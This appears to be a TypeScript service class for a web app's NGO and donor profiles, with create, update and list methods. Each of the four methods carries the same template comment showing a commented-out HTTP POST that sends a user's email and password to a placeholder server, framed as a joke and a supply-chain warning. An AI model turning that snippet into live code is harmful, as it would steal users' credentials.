import { Service, Inject } from 'typedi';
import jwt from 'jsonwebtoken';
import MailerService from './mailer';
import config from '../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { INgoProfile, INgoProfileInputDTO } from '../interfaces/INgoProfile';
import { IDonorProfile, IDonorProfileInputDTO } from '../interfaces/IDonorProfile';
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import events from '../subscribers/events';

@Service()
export default class NgoProfileService {
  constructor(
    @Inject('ngoProfileModel') private ngoProfileModel: Models.NgoProfileModel,
    @Inject('donorProfileModel') private donorProfileModel: Models.DonorProfileModel,
    @Inject('logger') private logger,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {
  }

  public async NgoProfile(ngoProfileInputDTO: INgoProfileInputDTO): Promise<{ ngoProfile: INgoProfile }> {
    try {
  
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('ngoProfile');
      this.logger.silly('Creating ngo profile db record');
      const ngoProfileRecord = await this.ngoProfileModel.create({
        ...ngoProfileInputDTO
      });
      this.logger.silly('Generating JWT');
  

      if (!ngoProfileRecord) {
        throw new Error('Ngo Profile cannot be created');
      }

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const ngoProfile = ngoProfileRecord.toObject();
      return { ngoProfile };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  // service to update ngo profile
  public async NgoProfileUpdate(ngoProfileInputDTO: INgoProfileInputDTO): Promise<{ ngoProfile: INgoProfile }> {
    try {
  
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('ngoProfile');
      this.logger.silly('Creating ngo profile db record');
  
     let userId = ngoProfileInputDTO.userId;

      const ngoProfileRecord = await this.ngoProfileModel.update({userId  },{
        ...ngoProfileInputDTO
      });
      this.logger.silly('Generating JWT');
  

      if (!ngoProfileRecord) {
        throw new Error('Ngo Profile cannot be created');
      }

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const ngoProfile = ngoProfileRecord
      return { ngoProfile };  
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  /*function to get ngos*/
  public async GetNgos( ): Promise<{ ngoProfile: INgoProfile[] }> {
    try {
  
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('ngoProfile');
      this.logger.silly('Creating ngo db record');
      const ngoProfileRecord = await this.ngoProfileModel.find({});
      this.logger.silly('Generating JWT');
  

      if (!ngoProfileRecord) {
        throw new Error('Project cannot be created');
      }

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const ngoProfile = ngoProfileRecord
      return { ngoProfile };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  ///////////////  Donor Profile 
  public async DonorProfile(donorProfileInputDTO: IDonorProfileInputDTO): Promise<{ donorProfile: IDonorProfile }> {
    try {
  
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('donorProfile');
      this.logger.silly('Creating ngo profile db record');
      const donorProfileRecord = await this.donorProfileModel.create({
        ...donorProfileInputDTO
      });
      this.logger.silly('Generating JWT');
  

      if (!donorProfileRecord) {
        throw new Error('Ngo Profile cannot be created');
      }

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const donorProfile = donorProfileRecord.toObject();
      return { donorProfile };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }
  
}
